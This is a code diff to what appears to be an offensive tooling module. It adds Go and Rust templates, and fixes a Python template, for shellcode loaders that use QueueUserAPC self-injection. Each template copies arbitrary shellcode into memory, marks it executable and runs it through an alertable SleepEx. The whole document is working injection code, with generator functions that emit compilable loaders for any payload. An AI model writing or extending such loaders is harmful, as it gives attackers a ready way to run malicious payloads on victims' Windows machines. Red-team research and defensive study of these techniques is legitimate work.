@@ -68,6 +68,8 @@ import sys
 {sc_bytes}
 
 kernel32 = ctypes.windll.kernel32
+kernel32.VirtualAlloc.restype    = ctypes.c_void_p
+kernel32.GetCurrentThread.restype = ctypes.c_void_p
 
 mem = kernel32.VirtualAlloc(None, len(sc),
                             0x3000,   # MEM_COMMIT | MEM_RESERVE
@@ -94,6 +96,86 @@ kernel32.SleepEx(0, True)
 """
 
 
+_GO_TEMPLATE = """\
+package main
+
+import (
+\t"syscall"
+\t"unsafe"
+)
+
+{sc_bytes}
+
+func main() {{
+\tk32               := syscall.NewLazyDLL("kernel32.dll")
+\tpVirtualAlloc     := k32.NewProc("VirtualAlloc")
+\tpVirtualFree      := k32.NewProc("VirtualFree")
+\tpVirtualProtect   := k32.NewProc("VirtualProtect")
+\tpQueueUserAPC     := k32.NewProc("QueueUserAPC")
+\tpGetCurrentThread := k32.NewProc("GetCurrentThread")
+\tpSleepEx          := k32.NewProc("SleepEx")
+\tpRtlMove          := k32.NewProc("RtlMoveMemory")
+
+\taddr, _, _ := pVirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
+\tif addr == 0 {{
+\t\treturn
+\t}}
+\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+\tvar old uint32
+\tif r, _, _ := pVirtualProtect.Call(addr, uintptr(len(sc)), 0x20,
+\t\tuintptr(unsafe.Pointer(&old))); r == 0 {{
+\t\tpVirtualFree.Call(addr, 0, 0x8000)
+\t\treturn
+\t}}
+\tcurr, _, _ := pGetCurrentThread.Call()
+\tif r, _, _ := pQueueUserAPC.Call(addr, curr, 0); r == 0 {{
+\t\tpVirtualFree.Call(addr, 0, 0x8000)
+\t\treturn
+\t}}
+\tpSleepEx.Call(0, 1)
+\tpVirtualFree.Call(addr, 0, 0x8000)
+}}
+"""
+
+_RS_TEMPLATE = """\
+#![allow(non_snake_case)]
+use std::ptr;
+
+#[link(name = "kernel32")]
+extern "system" {{
+    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
+                    flProtect: u32) -> *mut u8;
+    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
+    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32,
+                      lpflOldProtect: *mut u32) -> i32;
+    fn QueueUserAPC(pfnAPC: unsafe extern "system" fn(usize),
+                    hThread: *mut u8, dwData: usize) -> u32;
+    fn GetCurrentThread() -> *mut u8;
+    fn SleepEx(dwMilliseconds: u32, bAlertable: i32) -> u32;
+}}
+
+fn main() {{
+    {sc_bytes}
+    unsafe {{
+        let p = VirtualAlloc(ptr::null_mut(), sc.len(), 0x3000, 0x04);
+        if p.is_null() {{ return; }}
+        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
+        let mut old: u32 = 0;
+        if VirtualProtect(p, sc.len(), 0x20, &mut old) == 0 {{
+            VirtualFree(p, 0, 0x8000); return;
+        }}
+        let apc_fn: unsafe extern "system" fn(usize) = std::mem::transmute(p);
+        let curr = GetCurrentThread();
+        if QueueUserAPC(apc_fn, curr, 0) == 0 {{
+            VirtualFree(p, 0, 0x8000); return;
+        }}
+        SleepEx(0, 1);
+        VirtualFree(p, 0, 0x8000);
+    }}
+}}
+"""
+
+
 def generate_c(shellcode: bytes) -> str:
     """Return a compilable C loader using QueueUserAPC(self) + SleepEx(alertable)."""
     return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))
@@ -102,3 +184,13 @@ def generate_c(shellcode: bytes) -> str:
 def generate_python(shellcode: bytes) -> str:
     """Return a Python ctypes loader using QueueUserAPC self-injection."""
     return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
+
+
+def generate_go(shellcode: bytes) -> str:
+    """Return a Go loader using QueueUserAPC(self) + SleepEx(alertable)."""
+    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))
+
+
+def generate_rust(shellcode: bytes) -> str:
+    """Return a Rust loader using QueueUserAPC(self) + SleepEx(alertable)."""
+    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
